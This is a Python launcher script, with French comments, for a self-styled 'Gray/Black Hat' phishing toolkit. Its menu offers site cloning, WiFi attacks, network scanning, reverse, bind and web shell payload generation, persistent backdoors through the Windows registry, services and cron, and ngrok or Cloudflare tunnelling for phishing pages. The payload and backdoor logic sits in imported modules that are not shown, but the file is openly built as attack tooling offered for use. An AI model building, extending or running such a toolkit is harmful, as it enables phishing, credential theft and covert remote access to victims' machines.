#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🎣 ULTIMATE PHISHING TOOL v4.0 - LAUNCHER
Gray/Black Hat - Multi-Attack - WiFi - Advanced Pentest
"""

import os
import sys
import subprocess
import time
from colorama import init, Fore, Back, Style

# Initialisation des couleurs
init(autoreset=True)

def print_banner():
    """Affiche la bannière du tool"""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║              🎣 ULTIMATE PHISHING TOOL v4.0                    ║
║                                                                      ║
║  {Fore.GREEN}Gray/Black Hat - Multi-Attack - WiFi - Advanced Pentest{Fore.CYAN}      ║
║  {Fore.YELLOW}50+ Templates - WiFi Attacks - Network Scanner{Fore.CYAN}              ║
║  {Fore.RED}Payload Generator - Backdoor Creator - Tunnel Manager{Fore.CYAN}          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def check_dependencies():
    """Vérifie les dépendances"""
    print(f"{Fore.YELLOW}[*] Vérification des dépendances...{Style.RESET_ALL}")
    
    required_modules = [
        'flask', 'requests', 'user_agents', 'geocoder',
        'beautifulsoup4', 'paramiko', 'python-nmap',
        'qrcode', 'PIL', 'colorama'
    ]
    
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module.replace('-', '_'))
            print(f"{Fore.GREEN}✅ {module}{Style.RESET_ALL}")
        except ImportError:
            print(f"{Fore.RED}❌ {module}{Style.RESET_ALL}")
            missing_modules.append(module)
    
    if missing_modules:
        print(f"\n{Fore.RED}[!] Modules manquants: {', '.join(missing_modules)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Installation des dépendances...{Style.RESET_ALL}")
        
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            print(f"{Fore.GREEN}[+] Dépendances installées avec succès!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Échec de l'installation des dépendances{Style.RESET_ALL}")
            return False
    
    return True

def create_directories():
    """Crée les dossiers nécessaires"""
    print(f"\n{Fore.YELLOW}[*] Création des dossiers...{Style.RESET_ALL}")
    
    directories = [
        'templates', 'cloned_sites', 'exports', 'logs',
        'captures', 'payloads', 'backdoors', 'screenshots'
    ]
    
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"{Fore.GREEN}[+] Dossier {directory} créé{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[*] Dossier {directory} existe déjà{Style.RESET_ALL}")

def show_menu():
    """Affiche le menu principal"""
    print(f"\n{Fore.CYAN}🎯 MENU PRINCIPAL{Style.RESET_ALL}")
    print("=" * 50)
    print(f"{Fore.GREEN}1. 🖥️  Interface Graphique (Tkinter){Style.RESET_ALL}")
    print(f"{Fore.GREEN}2. 🖥️  Interface Console{Style.RESET_ALL}")
    print(f"{Fore.GREEN}3. 🌐 Cloner Site Web{Style.RESET_ALL}")
    print(f"{Fore.GREEN}4. 📡 Attaques WiFi{Style.RESET_ALL}")
    print(f"{Fore.GREEN}5. 🔍 Scan Réseau{Style.RESET_ALL}")
    print(f"{Fore.GREEN}6. 💣 Générer Payloads{Style.RESET_ALL}")
    print(f"{Fore.GREEN}7. 🚪 Créer Backdoors{Style.RESET_ALL}")
    print(f"{Fore.GREEN}8. 🚇 Gestionnaire de Tunnels{Style.RESET_ALL}")
    print(f"{Fore.GREEN}9. 📊 Statistiques{Style.RESET_ALL}")
    print(f"{Fore.RED}0. 🚪 Quitter{Style.RESET_ALL}")
    print("=" * 50)

def launch_gui():
    """Lance l'interface graphique"""
    print(f"{Fore.GREEN}[+] Lancement de l'interface graphique...{Style.RESET_ALL}")
    try:
        from ultimate_phishing_gui import UltimatePhishingGUI
        app = UltimatePhishingGUI()
        app.run()
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur interface graphique: {e}{Style.RESET_ALL}")

def launch_console():
    """Lance l'interface console"""
    print(f"{Fore.GREEN}[+] Lancement de l'interface console...{Style.RESET_ALL}")
    try:
        from ultimate_phishing import UltimatePhishingTool
        app = UltimatePhishingTool()
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur interface console: {e}{Style.RESET_ALL}")

def launch_wifi_attacks():
    """Lance les attaques WiFi"""
    print(f"{Fore.GREEN}[+] Lancement des attaques WiFi...{Style.RESET_ALL}")
    try:
        from core.wifi_attacks import WifiAttacks
        wifi = WifiAttacks()
        
        print(f"{Fore.YELLOW}[*] Scan des réseaux WiFi...{Style.RESET_ALL}")
        networks = wifi.scan_wifi_networks()
        
        if networks:
            print(f"{Fore.GREEN}[+] {len(networks)} réseaux trouvés{Style.RESET_ALL}")
            for i, network in enumerate(networks, 1):
                print(f"  {i}. {network.get('essid', 'Unknown')} - {network.get('encryption', 'Unknown')}")
        else:
            print(f"{Fore.RED}[!] Aucun réseau trouvé{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur attaques WiFi: {e}{Style.RESET_ALL}")

def launch_network_scanner():
    """Lance le scan réseau"""
    print(f"{Fore.GREEN}[+] Lancement du scan réseau...{Style.RESET_ALL}")
    try:
        from core.network_scanner import NetworkScanner
        scanner = NetworkScanner()
        
        target = input(f"{Fore.YELLOW}[?] Cible (IP/réseau): {Style.RESET_ALL}")
        if target:
            print(f"{Fore.YELLOW}[*] Scan en cours...{Style.RESET_ALL}")
            results = scanner.quick_scan(target)
            
            if results:
                print(f"{Fore.GREEN}[+] Scan terminé{Style.RESET_ALL}")
                print(f"  Hôtes trouvés: {len(results.get('hosts', []))}")
                print(f"  Services: {len(results.get('services', {}))}")
            else:
                print(f"{Fore.RED}[!] Erreur lors du scan{Style.RESET_ALL}")
                
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur scan réseau: {e}{Style.RESET_ALL}")

def launch_payload_generator():
    """Lance le générateur de payloads"""
    print(f"{Fore.GREEN}[+] Lancement du générateur de payloads...{Style.RESET_ALL}")
    try:
        from core.payload_generator import PayloadGenerator
        payload_gen = PayloadGenerator()
        
        print(f"{Fore.YELLOW}[*] Types de payloads disponibles:{Style.RESET_ALL}")
        print("  1. Reverse Shell (Windows/Linux)")
        print("  2. Bind Shell")
        print("  3. Web Shell")
        print("  4. PowerShell")
        print("  5. Python")
        
        choice = input(f"{Fore.YELLOW}[?] Choix: {Style.RESET_ALL}")
        
        if choice == "1":
            platform = input("Plateforme (windows/linux): ")
            lhost = input("LHOST: ")
            lport = input("LPORT: ")
            
            if platform and lhost and lport:
                result = payload_gen.generate_reverse_shell(platform, lhost, int(lport))
                if result:
                    print(f"{Fore.GREEN}[+] Payload généré: {result}{Style.RESET_ALL}")
                    
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur générateur payloads: {e}{Style.RESET_ALL}")

def launch_backdoor_creator():
    """Lance le créateur de backdoors"""
    print(f"{Fore.GREEN}[+] Lancement du créateur de backdoors...{Style.RESET_ALL}")
    try:
        from core.backdoor_creator import BackdoorCreator
        backdoor_creator = BackdoorCreator()
        
        print(f"{Fore.YELLOW}[*] Types de backdoors disponibles:{Style.RESET_ALL}")
        print("  1. Windows Registry")
        print("  2. Windows Service")
        print("  3. Linux Cron")
        print("  4. Linux Service")
        print("  5. Persistent (Windows/Linux)")
        
        choice = input(f"{Fore.YELLOW}[?] Choix: {Style.RESET_ALL}")
        
        if choice == "1":
            lhost = input("LHOST: ")
            lport = input("LPORT: ")
            payload_file = input("Fichier payload: ")
            
            if lhost and lport and payload_file:
                result = backdoor_creator.create_windows_registry_backdoor(lhost, int(lport), payload_file)
                if result:
                    print(f"{Fore.GREEN}[+] Backdoor créé: {result}{Style.RESET_ALL}")
                    
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur créateur backdoors: {e}{Style.RESET_ALL}")

def launch_tunnel_manager():
    """Lance le gestionnaire de tunnels"""
    print(f"{Fore.GREEN}[+] Lancement du gestionnaire de tunnels...{Style.RESET_ALL}")
    try:
        from core.tunnel_manager import TunnelManager
        tunnel_manager = TunnelManager()
        
        print(f"{Fore.YELLOW}[*] Types de tunnels disponibles:{Style.RESET_ALL}")
        print("  1. Ngrok")
        print("  2. Cloudflare")
        print("  3. LocalTunnel")
        print("  4. Proxy")
        
        choice = input(f"{Fore.YELLOW}[?] Choix: {Style.RESET_ALL}")
        
        if choice == "1":
            port = input("Port local (défaut: 8080): ") or "8080"
            result = tunnel_manager.start_ngrok(int(port))
            if result:
                print(f"{Fore.GREEN}[+] Tunnel Ngrok: {result}{Style.RESET_ALL}")
                
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur gestionnaire tunnels: {e}{Style.RESET_ALL}")

def show_statistics():
    """Affiche les statistiques"""
    print(f"{Fore.GREEN}[+] Affichage des statistiques...{Style.RESET_ALL}")
    
    # Compter les fichiers dans les dossiers
    directories = ['templates', 'captures', 'payloads', 'backdoors', 'exports']
    
    for directory in directories:
        if os.path.exists(directory):
            file_count = len([f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))])
            print(f"{Fore.CYAN}[*] {directory}: {file_count} fichiers{Style.RESET_ALL}")

def main():
    """Fonction principale"""
    try:
        print_banner()
        
        # Vérifier les dépendances
        if not check_dependencies():
            print(f"{Fore.RED}[!] Impossible de continuer sans les dépendances{Style.RESET_ALL}")
            return
        
        # Créer les dossiers
        create_directories()
        
        while True:
            show_menu()
            choice = input(f"{Fore.YELLOW}[?] Votre choix: {Style.RESET_ALL}")
            
            if choice == "1":
                launch_gui()
            elif choice == "2":
                launch_console()
            elif choice == "3":
                print(f"{Fore.YELLOW}[*] Utilisez l'interface graphique pour cloner des sites{Style.RESET_ALL}")
            elif choice == "4":
                launch_wifi_attacks()
            elif choice == "5":
                launch_network_scanner()
            elif choice == "6":
                launch_payload_generator()
            elif choice == "7":
                launch_backdoor_creator()
            elif choice == "8":
                launch_tunnel_manager()
            elif choice == "9":
                show_statistics()
            elif choice == "0":
                print(f"{Fore.GREEN}[+] Au revoir!{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[!] Choix invalide{Style.RESET_ALL}")
                
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Arrêt demandé par l'utilisateur{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main() 